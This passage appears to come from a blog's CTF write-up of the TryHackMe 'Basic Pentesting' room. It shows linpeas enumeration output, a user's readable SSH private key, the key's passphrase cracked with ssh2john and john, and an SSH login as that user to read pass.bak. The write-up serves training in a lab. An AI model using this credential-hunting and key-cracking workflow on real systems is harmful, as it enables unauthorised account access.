   532910      4 -rw-r--r--   1 root     root         2839 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/selinux/mdp/.mdp.cmd
   532908      4 -rw-r--r--   1 root     root         3239 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/selinux/genheaders/.genheaders.cmd
   532916      4 -rw-r--r--   1 root     root         1193 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/basic/.bin2c.cmd
   532914      8 -rw-r--r--   1 root     root         4268 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/basic/.fixdep.cmd
   532869      4 -rw-r--r--   1 root     root         2391 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.conmakehash.cmd
   532867      4 -rw-r--r--   1 root     root         3253 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.asn1_compiler.cmd
   532857      4 -rw-r--r--   1 root     root          153 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.genksyms.cmd
   532862      4 -rw-r--r--   1 root     root         2719 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.genksyms.o.cmd
   532866      4 -rw-r--r--   1 root     root         2481 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.parse.tab.o.cmd
   532861      4 -rw-r--r--   1 root     root         3347 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/genksyms/.lex.lex.o.cmd
   532870      4 -rw-r--r--   1 root     root         3387 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.recordmcount.cmd
   532918      8 -rw-r--r--   1 root     root         4495 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.extract-cert.cmd
   532919      4 -rw-r--r--   1 root     root         2380 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.kallsyms.cmd
   532886      4 -rw-r--r--   1 root     root         3485 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.file2alias.o.cmd
   532893      4 -rw-r--r--   1 root     root          104 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.elfconfig.h.cmd
   532887      8 -rw-r--r--   1 root     root         4622 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.modpost.o.cmd
   532894      8 -rw-r--r--   1 root     root         4451 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.sumversion.o.cmd
   532897      8 -rw-r--r--   1 root     root         5191 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.devicetable-offsets.s.cmd
   532898      4 -rw-r--r--   1 root     root         2537 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.mk_elfconfig.cmd
   532901      4 -rw-r--r--   1 root     root          546 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.devicetable-offsets.h.cmd
   532889      4 -rw-r--r--   1 root     root          129 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.modpost.cmd
   532896      4 -rw-r--r--   1 root     root         2289 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/mod/.empty.o.cmd
   532871      8 -rw-r--r--   1 root     root         5133 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.sign-file.cmd
   532884      4 -rw-r--r--   1 root     root         3755 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.conf.o.cmd
   532883      4 -rw-r--r--   1 root     root          110 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.conf.cmd
   532879      8 -rw-r--r--   1 root     root         4917 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/kconfig/.zconf.tab.o.cmd
   532872      4 -rw-r--r--   1 root     root         3568 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/scripts/.sortextable.cmd
   532844    188 -rw-r--r--   1 root     root       190243 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.config
   535090    188 -rw-r--r--   1 root     root       190367 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.config.old
   532847      4 -rw-r--r--   1 root     root          820 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/.missing-syscalls.d
   535088     16 -rw-r--r--   1 root     root        14210 Jul 18  2017 /usr/src/linux-headers-4.4.0-87-generic/kernel/.bounds.s.cmd
   276476      4 -rw-r--r--   1 root     root          155 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.kexec-purgatory.c.cmd
   276482      4 -rw-r--r--   1 root     root          333 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.purgatory.ro.cmd
   276488      4 -rw-r--r--   1 root     root         1379 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.setup-x86_64.o.cmd
   276485      4 -rw-r--r--   1 root     root         1309 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.stack.o.cmd
   276480     12 -rw-r--r--   1 root     root         9148 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.sha256.o.cmd
   276484      4 -rw-r--r--   1 root     root         3615 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.purgatory.o.cmd
   276487      4 -rw-r--r--   1 root     root         1329 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.entry64.o.cmd
   276486      4 -rw-r--r--   1 root     root         3601 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/purgatory/.string.o.cmd
   276459      4 -rw-r--r--   1 root     root          292 Apr  2  2018 /usr/src/linux-headers-4.4.0-119-generic/arch/x86/include/generated/asm/.syscalls_64.h.cmd

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 100)
-rwxr-xr-x 1 jan jan 134167 Apr 30 09:14 /tmp/linpeas.sh                                                       
-rw-r--r-- 1 root root 14659 Apr 23  2018 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 1458 Apr 18  2018 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 764 Apr 17  2018 /var/backups/apt.extended_states.2.gz

[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                 
/dev/mqueue                                                                                                    
/dev/mqueue/linpeas.txt
/dev/shm
/run/lock
/run/screen/S-jan
/run/user/1001
/run/user/1001/systemd
/sys/kernel/security/apparmor/.access
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.ns_level
/sys/kernel/security/apparmor/.ns_name
/sys/kernel/security/apparmor/.ns_stacked
/sys/kernel/security/apparmor/policy/.load
/sys/kernel/security/apparmor/policy/.remove
/sys/kernel/security/apparmor/policy/.replace
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.stacked
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.XIM-unix
/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-disk-by\x2duuid-db3bdca8\x2d5517\x2d4600\x2db896\x2de8479e05e44a.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-xvda5.swap/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/nmbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/run-user-1001.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/samba-ad-dc.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/smbd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/tomcat.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1001.slice/user@1001.service/tasks
/var/spool/samba
/var/tmp
/dev/mqueue/linpeas.txt

[+] Searching passwords in config PHP files
                                                                                                               
[+] Finding IPs inside logs (limit 100)
      9 /var/log/dpkg.log:2.29.4.2                                                                             
      9 /var/log/dpkg.log:2.16.04.2
      8 /var/log/dpkg.log:0.16.04.4
      8 /var/log/apt/history.log:0.16.04.2
      8 /var/log/apt/history.log:0.16.04.13
     80 /var/log/dpkg.log:1.16.04.1
     78 /var/log/dpkg.log:0.16.04.13
     77 /var/log/dpkg.log:0.16.04.2
      6 /var/log/apt/history.log:4.4.0.87
      6 /var/log/apt/history.log:1.16.04.3
      5 /var/log/apt/history.log:0.16.04.3
      4 /var/log/wtmp:192.168.56.101
      4 /var/log/installer/status:1.2.3.3
      4 /var/log/installer/status:0.16.04.1
     40 /var/log/dpkg.log:1.16.04.3
      3 /var/log/apt/history.log:4.4.0.119
      3 /var/log/apt/history.log:2.16.04.1
      3 /var/log/apt/history.log:1.16.04.4
      3 /var/log/apt/history.log:1.16.04.2
     39 /var/log/dpkg.log:4.4.0.87
     38 /var/log/dpkg.log:0.16.04.3
      2 /var/log/wtmp:10.8.32.129
      2 /var/log/bootstrap.log:0.99.7.1
      2 /var/log/apt/history.log:3.16.04.1
      2 /var/log/apt/history.log:0.96.20.7
     25 /var/log/dpkg.log:1.16.04.2
     24 /var/log/dpkg.log:1.16.04.4
     21 /var/log/dpkg.log:4.4.0.119
     21 /var/log/dpkg.log:2.16.04.1
     20 /var/log/dpkg.log:3.16.04.1
      1 /var/log/lastlog:192.168.56.102
      1 /var/log/lastlog:10.8.32.129
      1 /var/log/installer/status:2.21.63.3
      1 /var/log/bootstrap.log:0.5.5.1
      1 /var/log/apt/history.log:6.16.04.1
      1 /var/log/apt/history.log:3.16.04.3
      1 /var/log/apt/history.log:2.29.4.2
      1 /var/log/apt/history.log:2.16.04.2
      1 /var/log/apt/history.log:0.16.04.4
     18 /var/log/apt/history.log:0.16.04.1
     17 /var/log/dpkg.log:0.96.20.7
     15 /var/log/dpkg.log:3.16.04.3
     14 /var/log/wtmp:192.168.56.102
    138 /var/log/dpkg.log:0.16.04.1
     10 /var/log/dpkg.log:6.16.04.1
     10 /var/log/apt/history.log:1.16.04.1

[+] Finding passwords inside logs (limit 100)
/var/log/bootstrap.log: base-passwd depends on libc6 (&gt;= 2.8); however:                                        
/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (&gt;= 0.145); however:
/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
/var/log/bootstrap.log:Selecting previously unselected package passwd.
/var/log/bootstrap.log:Setting up base-passwd (3.5.39) ...
/var/log/bootstrap.log:Setting up passwd (1:4.2-3.1ubuntu5) ...
/var/log/bootstrap.log:Shadow passwords are now on.
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) ...
/var/log/bootstrap.log:Unpacking base-passwd (3.5.39) over (3.5.39) ...
/var/log/bootstrap.log:Unpacking passwd (1:4.2-3.1ubuntu5) ...
/var/log/dpkg.log:2017-08-01 11:16:21 configure base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:21 install base-passwd:amd64 &lt;none&gt; 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:21 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:21 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:21 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:21 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:23 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:23 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:23 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:23 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:28 install passwd:amd64 &lt;none&gt; 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:16:28 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:16:28 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:16:31 configure base-passwd:amd64 3.5.39 &lt;none&gt;
/var/log/dpkg.log:2017-08-01 11:16:31 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:31 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:31 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2017-08-01 11:16:37 configure passwd:amd64 1:4.2-3.1ubuntu5 &lt;none&gt;
/var/log/dpkg.log:2017-08-01 11:16:37 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:16:37 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:16:37 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:17:35 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:17:35 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:17:35 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2017-08-01 11:17:35 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2017-08-01 11:17:35 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2017-08-01 11:17:36 configure passwd:amd64 1:4.2-3.1ubuntu5.3 &lt;none&gt;
/var/log/dpkg.log:2017-08-01 11:17:36 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2017-08-01 11:17:36 status installed passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/dpkg.log:2017-08-01 11:17:36 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.3
/var/log/installer/status:Description: Set up users and passwords

[+] Finding emails inside logs (limit 100)
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com                                                            
     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com

[+] Finding *password* or *credential* files in home
                                                                                                               
[+] Finding '</span><span class="nb">pwd</span><span class="s1">' or '</span>passw<span class="s1">' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords                                                                                            
/home/kay/.ssh/authorized_keys                                                                                 
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
/var/www/html/development/j.txt
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'</span><span class="nb">.</span>
/etc/apache2/sites-available/default-ssl.conf:          <span class="c">#        Note that no password is obtained from the user. Every entry in the user</span>
/etc/apparmor.d/abstractions/authentication:  <span class="c"># databases containing passwords, PAM configuration files, PAM libraries</span>
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/samba/smb.conf.bak:<span class="p">;</span> add user script <span class="o">=</span> /usr/sbin/adduser <span class="nt">--quiet</span> <span class="nt">--disabled-password</span> <span class="nt">--gecos</span> <span class="s2">""</span> %u
/etc/samba/smb.conf.bak:   pam password change <span class="o">=</span> <span class="nb">yes</span>
/etc/samba/smb.conf.bak:   passwd chat <span class="o">=</span> <span class="k">*</span>Enter<span class="se">\s</span>new<span class="se">\s</span><span class="k">*</span><span class="se">\s</span>password:<span class="k">*</span> %n<span class="se">\n</span> <span class="k">*</span>Retype<span class="se">\s</span>new<span class="se">\s</span><span class="k">*</span><span class="se">\s</span>password:<span class="k">*</span> %n<span class="se">\n</span> <span class="k">*</span>password<span class="se">\s</span>updated<span class="se">\s</span>successfully<span class="k">*</span> <span class="nb">.</span>
/etc/samba/smb.conf.bak:   unix password <span class="nb">sync</span> <span class="o">=</span> <span class="nb">yes</span>
/etc/ssh/sshd_config:PermitEmptyPasswords no
/etc/ssh/sshd_config:PermitRootLogin prohibit-password
</code></pre></div></div>
<p>The ssh key <code class="language-plaintext highlighter-rouge">/home/kay/.ssh/id_rsa</code> is readable by us, so we can login as <code class="language-plaintext highlighter-rouge">kay</code> user.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh2john kay_rsa <span class="o">&gt;</span> kay_rsa.hash
<span class="nv">$ </span>john kay_rsa.hash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt   
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH, SSH private key <span class="o">[</span>RSA/DSA/EC/OPENSSH 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">*******</span>          <span class="o">(</span>kay_rsa<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-04-30 15:29<span class="o">)</span> 14.28g/s 1181Kp/s 1181Kc/s 1181KC/s behlat..bball40
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<h1 id="question-9---what-is-the-name-of-the-other-user-you-foundall-lower-case">Question 9 - What is the name of the other user you found(all lower case)?</h1>
<p>The answer is <code class="language-plaintext highlighter-rouge">kay</code>.</p>

<h1 id="question-10---if-you-have-found-another-user-what-can-you-do-with-this-information">Question 10 - If you have found another user, what can you do with this information?</h1>
<p>No answer needed.</p>

<h1 id="question-11---what-is-the-final-password-you-obtain">Question 11 - What is the final password you obtain?</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh kay@10.10.131.121 <span class="nt">-i</span> kay_rsa 
Enter passphrase <span class="k">for </span>key <span class="s1">'kay_rsa'</span>: 
kay@basic2:~<span class="nv">$ </span><span class="nb">cat </span>pass.bak 
</code></pre></div></div>
<p>The answer is inside the file <code class="language-plaintext highlighter-rouge">pass.bak</code></p>]]></content><author><name>akymos</name></author><category term="ctf" /><category term="ctf" /><category term="TryHackMe" /><summary type="html"><![CDATA[Room info Name: Basic Pentesting Link: https://tryhackme.com/room/basicpentestingjt Subscription: Free Difficulty: Easy Description: This is a machine that allows you to practise web app hacking and privilege escalation]]></summary></entry></feed>